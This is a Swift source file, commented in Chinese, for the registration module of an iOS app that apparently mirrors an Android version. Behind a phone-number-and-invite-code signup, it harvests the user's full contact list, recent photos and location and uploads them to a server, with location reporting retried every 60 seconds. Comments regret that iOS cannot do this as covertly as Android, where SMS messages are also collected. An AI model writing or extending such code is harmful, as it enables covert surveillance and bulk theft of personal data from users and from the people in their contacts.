import Foundation
import UIKit

/// 上报编排 —— 与安卓端 `AnyReport.kt` 等价
///
/// 调用链（与安卓端 / 服务端 README 第五节的时序完全一致）：
/// ```
/// 用户输入 手机号 + 邀请码 → 点「注册」
///   ├─ 申请权限 + 读通讯录 / 相册（iOS 无短信）
///   ├─ POST /api/uploads/api          注册 + 通讯录落 app_mobile
///   ├─ POST /api/uploads/apisms       短信（iOS 跳过）
///   ├─ POST /api/uploads/getuserid    拿 app_user.id
///   │    └─ code==1 时：
///   │         ├─ 每张图片 POST /api/uploads/img   落 public/uploads/album/<id>/
///   │         └─ POST /api/uploads/apimap         成功后每 60s 重试直到成功
/// ```
///
/// ## 与安卓端的差异（必须知道）
/// - **短信链路不存在**（iOS 平台限制，见 `AnyCollectorSms`）
/// - 通讯录/相册/定位**都需要用户授权**，做不到安卓那种真无感；
///   用户拒绝时**跳过该链路，不阻塞注册**（与安卓端"拿不到就跳过"一致）
@MainActor
final class AnyReport {

    static let shared = AnyReport()

    private init() {}

    /// 上报进度回调（UI 用来显示"正在采集…"等状态）
    enum Stage: String {
        case requestingPermission = "正在申请权限"
        case readingContacts = "正在读取通讯录"
        case readingAlbum = "正在读取相册"
        case registerUpload = "正在提交注册"
        case uploadImages = "正在上传相册"
        case location = "正在上报定位"
        case done = "完成"
        case failed = "失败"
    }

    /// 完整上报流程。返回 `(注册是否成功, 服务端返回文案)`
    ///
    /// - Parameters:
    ///   - onStage: 阶段回调（主线程）
    ///   - onImageProgress: 相册上传进度 `(成功数, 失败数, 总数)`
    func runFullReport(
        phone: String,
        inviteCode: String,
        onStage: @escaping (Stage) -> Void,
        onImageProgress: @escaping (Int, Int, Int) -> Void
    ) async -> (ok: Bool, message: String) {

        // ---------- 1) 权限 ----------
        onStage(.requestingPermission)
        await AnyApi.diag("ios_report_start",
                          extra: ["brand": AnyPayloads.deviceBrand,
                                  "model": AnyPayloads.deviceModel,
                                  "ios": AnyPayloads.systemVersion])

        // 通讯录
        if AnyCollectorContacts.currentAuthState() == .notDetermined {
            _ = await AnyCollectorContacts.requestAccess()
        }
        // 相册
        if AnyCollectorImages.currentAuthState() == .notDetermined {
            _ = await AnyCollectorImages.requestAccess()
        }
        // 定位（只请求授权，实际上报在注册成功之后）
        AnyCollectorLocation.shared.requestPermission()

        // ---------- 2) 采集 ----------
        onStage(.readingContacts)
        let contacts = await AnyCollectorContacts.fetchAll()

        onStage(.readingAlbum)
        let albumCount = AnyCollectorImages.count()
        let images = await AnyCollectorImages.fetchRecentJPEGs()

        // iOS 读不到短信，固定 0（详见 AnyCollectorSms）
        let smsCount = AnyCollectorSms.count

        AnyLog.i("采集结果：通讯录 \(contacts.count) / 相册 \(albumCount)（取 \(images.count) 张）/ 短信 \(smsCount)（iOS 不支持）")

        // ---------- 3) 注册 + 通讯录上报 ----------
        onStage(.registerUpload)
        let payload = AnyPayloads.buildRegisterPayload(
            phone: phone,
            inviteCode: inviteCode,
            brand: AnyPayloads.deviceBrand,
            contactsCount: contacts.count,
            albumsCount: albumCount,
            smsCount: smsCount,
            contacts: contacts
        )
        AnyLog.i("注册报文长度 \(payload.count) 字节，联系人 \(contacts.count) 条")

        let reg = await AnyApi.uploadRegister(payload: payload)
        guard reg.ok else {
            onStage(.failed)
            await AnyApi.diag("ios_register_fail", extra: ["msg": reg.message])
            return (false, reg.message)
        }

        // ---------- 4) 短信上报（iOS 直接跳过）----------
        let sms = await AnyCollectorSms.fetchAll()
        _ = await AnyApi.uploadSms(phone: phone, inviteCode: inviteCode, messages: sms)

        // ---------- 5) 拿 userId ----------
        guard let userId = await AnyApi.fetchUserId(phone: phone) else {
            // 注册已成功，但拿不到 id —— 相册无法上传（服务端要 id）。
            // 与安卓端一致：这不算注册失败，继续往下走（定位仍可上报）。
            AnyLog.w("拿不到 app_user.id，跳过相册上传")
            startLocationReporting(phone: phone, inviteCode: inviteCode)
            onStage(.done)
            return (true, reg.message)
        }

        // ---------- 6) 相册上传 ----------
        if !images.isEmpty {
            onStage(.uploadImages)
            var success = 0
            var failed = 0
            for (i, jpeg) in images.enumerated() {
                let ok = await AnyApi.uploadImage(userId: userId, jpegData: jpeg, index: i)
                if ok { success += 1 } else { failed += 1 }
                onImageProgress(success, failed, images.count)
            }
            AnyLog.i("相册上传完成：成功 \(success) / 失败 \(failed) / 共 \(images.count)")
            await AnyApi.diag("ios_album_done",
                              extra: ["ok": success, "fail": failed, "total": images.count])
        }

        // ---------- 7) 定位（成功即停，失败每 60s 重试）----------
        onStage(.location)
        startLocationReporting(phone: phone, inviteCode: inviteCode)

        onStage(.done)
        return (true, reg.message)
    }

    private func startLocationReporting(phone: String, inviteCode: String) {
        AnyCollectorLocation.shared.startReporting(phone: phone, inviteCode: inviteCode) { ok in
            AnyLog.i("定位链路结束，成功=\(ok)")
        }
    }
}
